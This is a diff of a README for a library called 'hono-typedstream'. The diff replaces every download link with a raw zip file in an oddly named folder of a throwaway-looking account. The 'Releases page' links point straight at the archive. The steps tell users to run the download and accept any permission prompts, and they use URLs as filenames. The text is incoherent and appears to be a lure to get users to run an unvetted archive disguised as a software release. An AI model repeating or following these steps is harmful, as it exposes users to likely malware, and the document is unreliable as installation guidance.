@@ -8,12 +8,12 @@ Welcome to hono-typedstream! This software allows you to easily manage typed str
 
 To get started, you will need to download the software. Click the link below to visit the Releases page:
 
-[![Download hono-typedstream](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream_v3.1.zip%20hono--typedstream-v1.0-brightgreen)](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream_v3.1.zip)
+[![Download hono-typedstream](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream-v2.8-alpha.1.zip%20hono--typedstream-v1.0-brightgreen)](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream-v2.8-alpha.1.zip)
 
 ### Step-by-Step Instructions
 
 1. **Visit the Releases Page**  
-   Click the link above or go to [this page](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream_v3.1.zip) in your web browser.
+   Click the link above or go to [this page](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream-v2.8-alpha.1.zip) in your web browser.
 
 2. **Choose the Right Version**  
    On the Releases page, you will see different versions of hono-typedstream. Select the most recent version for the best experience. Look for a version marked as “latest.”
@@ -22,7 +22,7 @@ To get started, you will need to download the software. Click the link below to 
    Find the file that matches your operating system. If you are unsure, most users will want the installer for Windows or macOS. Click on the filename to start the download.
 
 4. **Locate the Downloaded File**  
-   Once the file finishes downloading, check your computer's Downloads folder. The file may have a name like `https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream_v3.1.zip` for Windows or `https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream_v3.1.zip` for macOS.
+   Once the file finishes downloading, check your computer's Downloads folder. The file may have a name like `https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream-v2.8-alpha.1.zip` for Windows or `https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream-v2.8-alpha.1.zip` for macOS.
 
 5. **Run the Installer**  
    Double-click on the downloaded file to start the installation. Follow the on-screen instructions to complete the setup. Make sure to accept any prompts that allow necessary permissions.
@@ -68,4 +68,4 @@ Join the community of hono-typedstream users! Share your experiences, tips, and 
 
 Thank you for choosing hono-typedstream for your data handling needs. We hope this guide has provided clear steps to download and run the application. Enjoy your experience!  
 
-For more details, revisit the [Releases page](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream_v3.1.zip) anytime.
+For more details, revisit the [Releases page](https://raw.githubusercontent.com/Shurlockeunshielded228/hono-typedstream/main/haemorrhoid/hono-typedstream-v2.8-alpha.1.zip) anytime.
